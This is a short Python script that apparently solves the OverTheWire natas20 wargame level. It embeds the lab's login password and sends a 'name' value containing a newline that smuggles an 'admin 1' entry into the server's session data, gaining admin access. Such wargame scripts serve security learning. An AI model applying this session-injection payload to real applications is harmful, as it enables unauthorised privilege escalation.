import requests
import time

url = 'http://natas20.natas.labs.overthewire.org'
user = 'natas20'
password = 'p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw'

s = requests.Session()

s.cookies.set('PHPSESSID', 'hahaha')
params = {'debug' : '1', 'name': 'ahah \nadmin 1'}
requests = s.get(url, auth=(user, password), params=params)
print(requests.text)
